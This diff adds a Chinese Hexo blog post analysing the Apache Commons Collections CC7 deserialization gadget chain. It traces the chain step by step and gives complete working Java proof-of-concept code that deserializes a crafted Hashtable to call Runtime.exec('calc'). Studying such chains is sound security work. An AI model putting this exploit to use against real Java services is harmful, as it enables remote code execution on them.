@@ -1,0 +1,371 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>CC7分析 | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>CC7分析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Java/" style="color: #00bcd4">
+                    Java
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>Commons Collections是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实现。它的代码质量较高，被广泛应用于Java应用程序开发中。</p>
+<span id="more"></span>
+
+<p>先看下ysoserial的利用链</p>
+<p>Payload method chain:</p>
+<pre><code>java.util.Hashtable.readObject
+java.util.Hashtable.reconstitutionPut
+org.apache.commons.collections.map.AbstractMapDecorator.equals
+java.util.AbstractMap.equals
+org.apache.commons.collections.map.LazyMap.get
+org.apache.commons.collections.functors.ChainedTransformer.transform
+org.apache.commons.collections.functors.InvokerTransformer.transform
+java.lang.reflect.Method.invoke
+sun.reflect.DelegatingMethodAccessorImpl.invoke
+sun.reflect.NativeMethodAccessorImpl.invoke
+sun.reflect.NativeMethodAccessorImpl.invoke0
+java.lang.Runtime.exec
+</code></pre>
+<p>LazyMap.get后面和CC1的国外链一样，只是上半部分变了</p>
+<p>AbstractMap是HashMap的父类，先跟进到AbstractMap.equals</p>
+<p>在472行调用了get方法</p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444818883.png" alt="image-1708444818883"></p>
+<p>再看一下AbstractMapDecorator.equals，AbstractMapDecorator是LazyMap的父类</p>
+<p>调用了map的equals方法</p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444824588.png" alt="image-1708444824588"></p>
+<p>map在LazyMap进行了赋值</p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444830351.png" alt="image-1708444830351"></p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444834090.png" alt="image-1708444834090"></p>
+<p>所以现在LazyMap#decorate传进去参数，然后调用LazyMap.equals，它会调用到父类的equals，然后调用到HashMap的父类AbstractMap.equals,满足判断条件后会调用get方法</p>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><pre><code>public static void main(String[] args) throws Exception&#123;
+        Transformer[] transform1 = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transform1);
+
+        HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+
+        map1.put(1,2);
+        map2.put(3,4);
+        Map decorate1 = LazyMap.decorate(map1, chainedTransformer);
+        Map decorate2 = LazyMap.decorate(map2, chainedTransformer);
+
+        decorate1.equals(decorate2);
+    &#125;
+</code></pre>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444842599.png" alt="image-1708444842599"></p>
+<p>看一下Hashtable.reconstitutionPut，判断e.hash &#x3D;&#x3D;<br>hash，两次传递的key，经过hashCode处理后的hash需要相同</p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444848402.png" alt="image-1708444848402"></p>
+<p>然后又看到reconstitutionPut被当前类的readObject调用</p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444857092.png" alt="image-1708444857092"></p>
+<h2 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h2><pre><code>package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class CC7_Test &#123;
+    public static void main(String[] args) throws Exception&#123;
+        Transformer[] transform = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[0]);
+
+        HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+
+        map1.put(&quot;yy&quot;,1);
+        map2.put(&quot;zZ&quot;,1);
+        Map decorate1 = LazyMap.decorate(map1, chainedTransformer);
+        Map decorate2 = LazyMap.decorate(map2, chainedTransformer);
+
+        Hashtable objectObjectHashtable = new Hashtable();
+        objectObjectHashtable.put(decorate1,1);
+        objectObjectHashtable.put(decorate2,2);
+
+        Class c = chainedTransformer.getClass();
+        Field iTransformers = c.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transform);
+
+        serialize(objectObjectHashtable);
+        unserialize(&quot;ser.bin&quot;);
+
+    &#125;
+    public static void serialize(Object obj) throws Exception&#123;
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+        System.out.println(&quot;serialize&quot;);
+    &#125;
+
+    public static Object unserialize(String str) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(str));
+        Object obj = objectInputStream.readObject();
+        System.out.println(&quot;unserialize&quot;);
+        return obj;
+    &#125;
+
+&#125;
+</code></pre>
+<h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>运行后没有弹计算器</p>
+<p>调试发现size&#x3D;1，m.size等于2，进入了if里面直接返回了false</p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444892748.png" alt="image-1708444892748"></p>
+<p>将第一个map传进去的值移除再次调试通过了if</p>
+<p>decorate2.remove(&quot;yy&quot;)</p>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444897983.png" alt="image-1708444897983"></p>
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre><code>package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class CC7_Test &#123;
+    public static void main(String[] args) throws Exception&#123;
+        Transformer[] transform = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[0]);
+
+        HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+
+        map1.put(&quot;yy&quot;,1);
+        map2.put(&quot;zZ&quot;,1);
+        Map decorate1 = LazyMap.decorate(map1, chainedTransformer);
+        Map decorate2 = LazyMap.decorate(map2, chainedTransformer);
+
+        Hashtable objectObjectHashtable = new Hashtable();
+        objectObjectHashtable.put(decorate1,1);
+        objectObjectHashtable.put(decorate2,2);
+
+        Class c = chainedTransformer.getClass();
+        Field iTransformers = c.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transform);
+
+        decorate2.remove(&quot;yy&quot;);
+
+        serialize(objectObjectHashtable);
+        unserialize(&quot;ser.bin&quot;);
+
+    &#125;
+    public static void serialize(Object obj) throws Exception&#123;
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+        System.out.println(&quot;serialize&quot;);
+    &#125;
+
+    public static Object unserialize(String str) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(str));
+        Object obj = objectInputStream.readObject();
+        System.out.println(&quot;unserialize&quot;);
+        return obj;
+    &#125;
+
+&#125;
+</code></pre>
+<p><img src="/../imgs/CC7%E5%88%86%E6%9E%90/image-1708444906587.png" alt="image-1708444906587"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
